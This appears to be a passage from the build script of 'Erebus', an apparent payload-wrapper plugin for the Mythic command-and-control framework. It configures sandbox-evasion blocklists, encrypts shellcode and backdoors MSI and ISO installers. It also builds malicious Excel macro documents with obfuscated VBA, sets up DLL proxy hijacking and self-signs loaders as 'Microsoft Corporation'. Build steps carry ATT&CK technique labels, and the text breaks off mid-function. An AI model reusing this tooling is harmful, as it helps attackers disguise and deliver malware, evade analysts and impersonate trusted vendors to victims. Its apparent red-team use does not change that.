                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1g Block Analysis Hostnames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1h Block Analysis Usernames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1i IP Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1j IP Blacklist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1k Domain Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "2.0 Compression Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

# TODO:
# Add more decryption support to loaders
        BuildParameter(
            name = "2.1 Encryption Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                # "AES128_CBC",
                # "AES256_CBC",
                # "AES256_ECB",
                # "CHACHA20",
                # "SALSA20",
                "RC4",
                "XOR",
                # "XOR_COMPLEX",
            ],
            default_value = "XOR"
        ),

        BuildParameter(
            name = "2.2 Encryption Key",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.3 Encoding Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.4 Shellcode Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a format for the obfuscated shellcode.",
            choices = [
                # Uncomment lines for custom loaders
                "C",
                "CSharp",
                # "Nim",
                # "Go",
                # "Python",
                # "Powershell",
                # "VBA",
                # "VBScript",
                # "Rust",
                # "JavaScript",
                # "Zig",
                "Raw",
            ],
            default_value = "C",
            required = True,
        ),

        # Archive
        BuildParameter(
            name = "3.0 Container Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose the final payload container type.",
            choices = ["ISO", "7z", "Zip", "MSI"],
            default_value = "Zip",
        ),

        BuildParameter(
            name="3.1 Compression Level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select compression level (9 is max).",
            choices=["0", "1", "3", "5", "7", "9"],
            default_value="9",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        BuildParameter(
            name="3.2 Archive Password",
            parameter_type=BuildParameterType.String,
            description="Optional password for the archive (leave empty for none).",
            default_value="",
            required=False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
            ]
        ),

        #ISO
        BuildParameter(
            name="4.0 ISO Volume ID",
            parameter_type=BuildParameterType.String,
            description="ISO Volume name seen in Explorer.",
            default_value="EREBUS",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.1 ISO enable Autorun",
            parameter_type=BuildParameterType.Boolean,
            description="Enable Autorun for ISO",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.2 ISO Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing ISO",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),
        BuildParameter(
            name="5.0 MSI Product Name",
            parameter_type=BuildParameterType.String,
            description="Application name shown in MSI/UI",
            default_value="System Updater",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.1 MSI Manufacturer",
            parameter_type=BuildParameterType.String,
            description="Company name shown in MSI metadata",
            default_value="Microsoft Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.2 MSI Install Scope",
            parameter_type=BuildParameterType.ChooseOne,
            description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
            choices=["User", "Machine"],
            default_value="User",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),

        BuildParameter(
            name="5.3 Enable MSI Backdoor",
            parameter_type=BuildParameterType.Boolean,
            description="Enable backdoor functionality for MSI installer",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.4 MSI Backdoor File",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing MSI installer by injecting payload execution",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.5 MSI Attack Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="""Attack vector for MSI backdoor injection:
- execute: Run command via CustomAction (stealthiest)
- run-exe: Extract and execute EXE from Binary table
- load-dll: Load native DLL via DllEntry
- dotnet: Load .NET assembly (auto-detected)
- script: Execute VBScript/JScript (requires entry point)""",
            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
            default_value="execute",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.6 MSI Entry Point",
            parameter_type=BuildParameterType.String,
            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.7 MSI Command Arguments",
            parameter_type=BuildParameterType.String,
            description="Command line arguments for execute/run-exe attacks",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.8 MSI Execution Condition",
            parameter_type=BuildParameterType.String,
            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
            default_value="NOT REMOVE",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.9 MSI Custom Action Name",
            parameter_type=BuildParameterType.String,
            description="Custom action name (leave empty for random generation)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        #Codesigning
        BuildParameter(
            name="6.0 Codesign Loader",
            parameter_type=BuildParameterType.Boolean,
            description="Sign the loader with a code signing cert",
            required=False,
            hide_conditions = [
                HideCondition(name="0.3 Loader Build Configuration", operand=HideConditionOperand.NotEQ, value="test"),
            ]
        ),

        BuildParameter(
            name="6.1 Codesign Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose how you want to sign the payload",
            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
            required=False,
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
            ]
        ),

        BuildParameter(
            name="6.2 Codesign CN",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Common Name (CN) for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.3 Codesign Orgname",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Organisation Name for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.4 Codesign Spoof URL",
            parameter_type=BuildParameterType.String,
            default_value="www.google.com",
            description="URL to clone certificate details from",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
            ]
        ),

        BuildParameter(
            name="6.5 Codesign Cert",
            parameter_type=BuildParameterType.File,
            description="Upload PFX/P12 certificate",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),
        BuildParameter(
            name="6.6 Codesign Cert Password",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Certificate password (leave empty if none)",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),

]

    build_steps = [
        BuildStep(step_name = "[T1005] - Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "[T1027] - Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "[T1027] - Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "[T1518] - Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "[T1218.002] - Compiling CPL Payload",
                  step_description = "Compiling CPL Applet with Obfuscated Shellcode"),

        BuildStep(step_name = "[T1559.002] - Compiling XLL Add-In",
                  step_description = "Compiling XLL Add-In DLL with Obfuscated Shellcode"),

        BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader"),

        BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
            step_description = "Compiling ClickOnce Loader"),

        BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
            step_description = "Signing the Shellcode Loader with a code signing certificate"),

        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
                  step_description = "Creating or backdooring Excel document with VBA payload"),

        BuildStep(step_name = "[T1137.006] - Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "[T1218.007] - Staging MSI",
                  step_description = "Staging uploaded MSI for backdoor injection"),

        BuildStep(step_name = "[T1036.008] - Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "[T1027] - Containerising",
                  step_description = "Adding payload into chosen container"),
    ]

    def calculate_sha256(self, file_path: str) -> str:
        """Calculate SHA256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

    def add_to_iocs(self, iocs_list: list, file_path: str, timestamp: str = None) -> None:
        """Add a file's hash to IOCs list"""
        if timestamp is None:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            if os.path.exists(file_path):
                sha256 = self.calculate_sha256(file_path)
                filename = os.path.basename(file_path)
                iocs_list.append({
                    'timestamp': timestamp,
                    'filename': filename,
                    'sha256': sha256,
                    'full_path': file_path
                })
        except Exception as e:
            print(f"[!] Failed to calculate hash for {file_path}: {str(e)}")

    def generate_iocs_file(self, iocs_list: list, output_path: str) -> None:
        """Generate IOCs.txt file with all file hashes"""
        if not iocs_list:
            return

        try:
            with open(output_path, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("EREBUS WRAPPER - GENERATED INDICATORS OF COMPROMISE (IOCs)\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Generation Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n")
                f.write(f"Total Files: {len(iocs_list)}\n\n")
                f.write("-" * 80 + "\n")
                f.write(f"{'Timestamp':<20} {'Filename':<40} {'SHA256 Hash':<60}\n")
                f.write("-" * 80 + "\n\n")

                for ioc in iocs_list:
                    f.write(f"{ioc['timestamp']:<20} {ioc['filename']:<40} {ioc['sha256']:<60}\n")

                f.write("\n" + "-" * 80 + "\n")
                f.write("Detailed Information:\n")
                f.write("-" * 80 + "\n\n")

                for idx, ioc in enumerate(iocs_list, 1):
                    f.write(f"[{idx}] {ioc['filename']}\n")
                    f.write(f"    Timestamp: {ioc['timestamp']}\n")
                    f.write(f"    SHA256:    {ioc['sha256']}\n")
                    f.write(f"    Path:      {ioc['full_path']}\n\n")
        except Exception as e:
            print(f"[!] Failed to generate IOCs file: {str(e)}")

    async def obfuscate_vba(self, vba_code):
        """Obfuscate VBA code locally or via plugin"""
        try:
            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
            plugin = PayloadMalDocsPlugin()
            return plugin.obfuscate_vba(vba_code)
        except ImportError:
            # Fallback: simple obfuscation without plugin
            import re
            obfuscated = vba_code
            replacements = {
                'Shell': 'Sh' + chr(101) + 'll',
                'CreateObject': 'Cr' + chr(101) + 'ateObject',
                'WScript': 'WSc' + chr(114) + 'ipt',
            }
            for original, replacement in replacements.items():
                obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
            return obfuscated


    def _bundle_helper_as_single_file(self, helper_src: Path, output_path: Path) -> None:
        """Merge all Erebus.Helper module sources into a single standalone Python script.

        The resulting file has no relative imports and can be run directly as
        ``python erebus_helper.py <command>`` on a Windows host, or compiled
        into a single exe via ``pyinstaller --onefile erebus_helper.py``.
        """
        module_order = ["compile_xll", "trigger_lnk", "container_msi"]
        # Relative-import lines produced by __init__.py – strip them from main.py
        strip_prefixes = ("from modules.", "from .compile_xll", "from .trigger_lnk", "from .container_msi")

        sections: list[str] = []

        # 1. One shared header with all stdlib imports so duplicates collapse naturally
        sections.append(
            "#!/usr/bin/env python3\n"
            "# erebus_helper.py – auto-generated single-file bundle\n"
            "# Run: python erebus_helper.py <command> [options]\n"
            "# Or compile: pyinstaller --onefile erebus_helper.py\n"
        )

        # 2. Emit each module body, stripping its module-level docstring marker and
        #    any intra-package imports so nothing references 'modules.*'
        for mod_name in module_order:
            mod_path = helper_src / "modules" / f"{mod_name}.py"
            if not mod_path.exists():
                continue
            src = mod_path.read_text(encoding="utf-8")
            # Drop lines that are relative imports (they'll be inlined here)
            filtered = "\n".join(
                line for line in src.splitlines()
                if not any(line.startswith(p) for p in strip_prefixes)
            )
            sections.append(f"\n# {'='*72}\n# Module: {mod_name}\n# {'='*72}\n")
            sections.append(filtered)

        # 3. Emit main.py, dropping only the 'from modules.*' import lines
        main_path = helper_src / "main.py"
        main_src = main_path.read_text(encoding="utf-8")
        filtered_main = "\n".join(
            line for line in main_src.splitlines()
            if not any(line.startswith(p) for p in strip_prefixes)
        )
        sections.append(f"\n# {'='*72}\n# main\n# {'='*72}\n")
        sections.append(filtered_main)

        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text("\n".join(sections), encoding="utf-8")

    async def containerise_payload(self,agent_build_path):
        """Creates a container and adds all files generated from the payload function inside of the given archive/media"""

        ext_source = self.get_parameter("0.8 Output Extension Source")
        if ext_source == "MalDoc":
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")
            if maldoc_mode == "VBA Module Only":
                target_ext = ".bas"
            else:
                target_ext = ".xlsm"
        else:
            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"


        match(self.get_parameter("3.0 Container Type")):
            case "7z":
                return build_7z(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "Zip":
                return build_zip(
                    compression=self.get_parameter("3.1 Compression Level"),
                    password=self.get_parameter("3.2 Archive Password"),
                    build_path=Path(agent_build_path),
                    visible_extension=target_ext
                )

            case "ISO":
                source_iso_path = None
                iso_uuid = self.get_parameter("4.2 ISO Backdoor File")
                if iso_uuid:
                    file_resp = await SendMythicRPCFileGetContent(
                        MythicRPCFileGetContentMessage(AgentFileId=iso_uuid)
                    )
                    if file_resp.Success:
                        filename = f"template_{iso_uuid}.iso"
                        temp_dir = Path(tempfile.gettempdir())
                        source_iso_path = temp_dir / filename
                        source_iso_path.write_bytes(file_resp.Content)
                return build_iso(
                                    volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                    enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                    source_iso=source_iso_path,
                                    build_path=Path(agent_build_path),
                                    visible_extension=target_ext
                                )

            case "MSI":
                return build_msi(
                    build_path=Path(agent_build_path),
                    app_name=self.get_parameter("5.0 MSI Product Name"),
                    manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                    install_scope=self.get_parameter("5.2 MSI Install Scope")
                )

        return None

    async def build(self) -> BuildResponse:
        response = BuildResponse(status = BuildStatus.Error)
        output = ""

        try:
            if not ErebusWrapper._validation_run:
                ErebusWrapper._validation_run = True
                run_plugin_validation()
                try:
                    await report_validation_results(operation_id=getattr(self, "operation_id", None))
                except Exception as e:
                    print(f"[!] Could not report plugin status: {e}")

            # Initialize IOCs tracking list
            iocs_list = []
            generation_timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
            agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
            copy_tree(str(agent_code_path), agent_build_path)

            mythic_shellcode_path = PurePath(agent_build_path) / "shellcode" / "payload.bin"
            mythic_shellcode_path = str(mythic_shellcode_path)

            obfuscated_shellcode_path = PurePath(agent_build_path) / "shellcode" / "obfuscated.bin"
            obfuscated_shellcode_path = str(obfuscated_shellcode_path)

            shellcode_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader"
            clickonce_loader_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.ClickOnce"
            encrypted_shellcode_path_sc = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "include" / "shellcode.hpp"
            encrypted_shellcode_path_xll = PurePath(agent_build_path) / "erebus_xll" / "xll_shellcode.h"

            # Build XLL in the main erebus_xll directory (inside the working build tree)
            xll_build_dir = Path(agent_build_path) / "erebus_xll"
            xll_build_dir.mkdir(parents=True, exist_ok=True)
            xll_source_path = xll_build_dir / "xll_payload.cpp"
            xll_config_path = xll_build_dir / "xll_config.h"
            xll_shellcode_path = xll_build_dir / "xll_shellcode.h"
            xll_inject_path = xll_build_dir / "xll_inject.h"

            shellcode_loader_path = str(shellcode_loader_path)
            clickonce_loader_path = str(clickonce_loader_path)
            encrypted_shellcode_path_sc = str(encrypted_shellcode_path_sc)
            encrypted_shellcode_path_xll = str(encrypted_shellcode_path_xll)

            shellcrypt_path = PurePath(agent_build_path) / "shellcrypt" / "shellcrypt.py"
            shellcrypt_path = str(shellcrypt_path)

            templates_path = PurePath(agent_build_path) / "templates"
            dll_exports_path = templates_path / "proxy.def"
            loader_exports_path = PurePath(agent_build_path) / "Erebus.Loaders" / "Erebus.Loader" / "defs" / "proxy.def"

            dll_target_path = templates_path / "dll_target.dll"

            templates_path = str(templates_path)
            dll_exports_path = str(dll_exports_path)
            loader_exports_path = str(loader_exports_path)
            Path(loader_exports_path).parent.mkdir(parents=True, exist_ok=True)

            # Create payload directory if it doesn't exist
            payload_dir = Path(agent_build_path) / "payload"
            payload_dir.mkdir(parents=True, exist_ok=True)

            environment = Environment(loader=FileSystemLoader(templates_path))

            custom_sc_enabled = self.get_parameter("0.0a Enable Custom Shellcode")

            # Validate wrapped_payload - only required when not using custom shellcode
            if self.wrapped_payload is None and not custom_sc_enabled:
                response.status = BuildStatus.Error
                response.build_stderr = "No wrapped payload provided. The wrapped_payload is None."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1005] - Gathering Files",
                    StepStdout="No wrapped payload provided (wrapped_payload is None).",
                    StepSuccess=False
                ))
                return response

            # Write Mythic payload as the initial shellcode source (may be overridden below)
            with open(mythic_shellcode_path, "wb") as file:
                if self.wrapped_payload is not None:
                    file.write(self.wrapped_payload)

            # Custom shellcode override - replaces the Mythic payload entirely
            if custom_sc_enabled:
                custom_sc_uuid = self.get_parameter("0.0b Custom Shellcode File")
                if not custom_sc_uuid:
                    response.status = BuildStatus.Error
                    response.build_stderr = "Custom Shellcode is enabled but no file was uploaded."
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1005] - Gathering Files",
                        StepStdout="Custom shellcode enabled but no file provided.",
                        StepSuccess=False
                    ))
                    return response

                custom_sc_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=custom_sc_uuid)
                )
                if not custom_sc_resp.Success or not custom_sc_resp.Content:
                    response.status = BuildStatus.Error
                    response.build_stderr = "Failed to retrieve custom shellcode file from Mythic."
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1005] - Gathering Files",
                        StepStdout="Failed to retrieve custom shellcode file.",
                        StepSuccess=False
                    ))
                    return response

                with open(mythic_shellcode_path, "wb") as file:
                    file.write(custom_sc_resp.Content)

                output += "[+] Custom shellcode loaded - Mythic wrapped payload ignored.\n"
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1005] - Gathering Files",
                    StepStdout=f"Custom shellcode loaded ({len(custom_sc_resp.Content)} bytes). Mythic payload overridden.",
                    StepSuccess=True
                ))

            if os.stat(mythic_shellcode_path).st_size == 0:
                response.status = BuildStatus.Error
                response.build_stderr = "Shellcode file is empty - nothing to process."
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1005] - Gathering Files",
                        StepStdout="Shellcode file is empty after write.",
                        StepSuccess=False
                    ))
                return response

            response.status = BuildStatus.Success
            response.build_message = "Files Gathered for Modification."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID = self.uuid,
                StepName = "[T1005] - Gathering Files",
                StepStdout = "Gathered files to obfuscate shellcode",
                StepSuccess = True
            ))

            ######################### Shellcode Obfuscation Section #########################
            # Defaults for config template rendering (may be updated after shellcrypt output)
            encryption_type_map = {
                "NONE": 0,
                "XOR": 1,
                "RC4": 2,
                "AES_ECB": 3,
                "AES_CBC": 4,
            }
            encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
            encryption_key_bytes = "0x00"
            encryption_iv_bytes = ", ".join(["0x00"] * 16)
            with open(str(mythic_shellcode_path), "rb") as f:
                header = f.read(2)
                if header == b"\x4d\x5a":
                    response.status = BuildStatus.Error
                    response.build_stderr = "Supplied payload is a PE instead of raw shellcode."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1027] - Header Check",
                        StepStdout="Found leading MZ header - supplied file was not shellcode",
                        StepSuccess=False
                    ))
                    return response
            response.status = BuildStatus.Success
            response.build_message = "No leading MZ header found in payload."
            await SendMythicRPCPayloadUpdatebuildStep(
                MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="[T1027] - Header Check",
                StepStdout="No leading MZ header found in payload",
                StepSuccess=True
            ))

            cmd = [
                "python",
                shellcrypt_path,
                "-i", mythic_shellcode_path,
                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                # "-f", SHELLCODE_FORMAT[self.get_parameter("2.4 Shellcode Format")],
            ]

            match self.get_parameter("0.1 Loader Type"):
                case "ClickOnce":
                    cmd += ["-f", "csharp"]
                case "Shellcode Loader":
                    cmd += ["-f", "c"]
                case _:
                    cmd += ["-f", "c"]

            if self.get_parameter("2.4 Shellcode Format") != "Raw":
                cmd += ["-a", "shellcode"]

            if self.get_parameter("2.0 Compression Type") != "NONE":
                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

            if self.get_parameter("2.3 Encoding Type") != "NONE":
                cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]

            if self.get_parameter("2.2 Encryption Key") != "NONE":
                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

            cmd += ["-o", obfuscated_shellcode_path]

            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            if os.path.exists(obfuscated_shellcode_path):
                # Always get shellcrypt output in C format to extract key/IV for config template
                try:
                    import re
                    key_cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        "-f", "c",
                        "-a", "shellcode",
                    ]

                    if self.get_parameter("2.2 Encryption Key") != "NONE":
                        key_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                    if self.get_parameter("2.0 Compression Type") != "NONE":
                        key_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                    if self.get_parameter("2.3 Encoding Type") != "NONE":
                        key_cmd += ["-d", ENCODING_METHODS[self.get_parameter("2.3 Encoding Type")]]

                    shellcode_src = subprocess.check_output(key_cmd, text=True)

                    key_match = re.search(r"unsigned char\s+key\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
                    if key_match:
                        encryption_key_bytes = ", ".join(x.strip() for x in key_match.group(1).split(",") if x.strip())

